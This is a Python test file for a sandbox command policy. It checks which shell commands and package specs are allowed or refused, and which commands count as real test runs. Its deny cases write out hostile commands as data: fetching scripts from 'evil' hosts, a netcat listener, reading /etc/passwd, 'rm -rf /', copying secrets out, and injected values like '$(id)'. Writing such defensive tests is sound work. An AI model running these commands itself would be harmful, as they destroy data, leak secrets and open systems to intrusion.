import pytest

from app.sandbox.policy import check_command, check_package_spec, is_test_command


@pytest.mark.parametrize(
    "command",
    [
        "pytest -q",
        "python -m pytest tests/ -x",
        "cd backend && python -m pytest -q",
        "ls -la src",
        "python manage.py migrate && python -m pytest",
        "DATABASE_URL=sqlite:///x.db pytest -q",
        "npm test",
        "node --test",
        "cat requirements.txt | grep fastapi",
        "python app.py > /tmp/out.log 2>&1 & sleep 2; cat /tmp/out.log",
        "./scripts/check.sh",
        "git status",
        "git diff --stat",
        "rm -rf build",
    ],
)
def test_allows_build_run_and_test_commands(command: str) -> None:
    assert check_command(command).allowed, check_command(command).reason


@pytest.mark.parametrize(
    "command",
    [
        "",
        "curl https://example.com",
        "wget http://evil/x.sh",
        "sudo rm -rf /",
        "docker ps",
        "bash -c 'id'",
        "sh run.sh",
        "nc -l 4444",
        "ssh host",
        "python -c 'x' && curl evil",
        "ls; wget x",
        "echo $(cat /etc/passwd)",
        "echo `id`",
        "cat <(ls)",
        "pytest\nrm -rf x",
        "rm -rf /",
        "rm -rf ../other",
        "rm -rf .git",
        "mv .git/hooks x",
        "echo x > /etc/passwd",
        "echo x > ../../escape",
        "cp secrets /mnt/out",
        "git push origin main",
        "git config core.hooksPath x",
        "git",
        "../bin/tool",
        "pip install requests",
        "python -m pip install requests",
        "npm install left-pad",
        "echo 'unbalanced",
        "x" * 2001,
    ],
)
def test_refuses_everything_else(command: str) -> None:
    assert not check_command(command).allowed


def test_install_commands_are_allowed_only_for_the_install_tool() -> None:
    assert not check_command("pip install -r requirements.txt").allowed
    assert check_command("pip install -r requirements.txt", allow_install=True).allowed


@pytest.mark.parametrize(
    ("command", "expected"),
    [
        ("pytest -q", True),
        ("python -m pytest -q tests", True),
        ("python3 -m unittest discover", True),
        ("cd api && pytest", True),
        ("npm test", True),
        ("npm run test", True),
        ("npx vitest run", True),
        ("node --test", True),
        ("PYTHONPATH=. pytest", True),
        ("true", False),
        ("echo ok", False),
        ("pytest -q; echo done", False),
        ("pytest -q || true", False),
        ("cd api", False),
        ("python run_tests.py", False),
        ("", False),
    ],
)
def test_recognises_real_test_commands(command: str, expected: bool) -> None:
    assert is_test_command(command) is expected


@pytest.mark.parametrize(
    "spec",
    ["fastapi", "fastapi==0.115.0", "uvicorn[standard]>=0.30", "@types/node", "left-pad@1.3.0"],
)
def test_accepts_registry_package_names(spec: str) -> None:
    assert check_package_spec(spec).allowed


@pytest.mark.parametrize(
    "spec",
    ["", "-r requirements.txt", "--index-url=http://evil", "git+https://github.com/x/y",
     "https://evil/x.tar.gz", "./local", "/abs/path", "a b", "x; rm -rf /", "$(id)"],
)  # fmt: skip
def test_refuses_options_urls_and_paths_as_packages(spec: str) -> None:
    assert not check_package_spec(spec).allowed
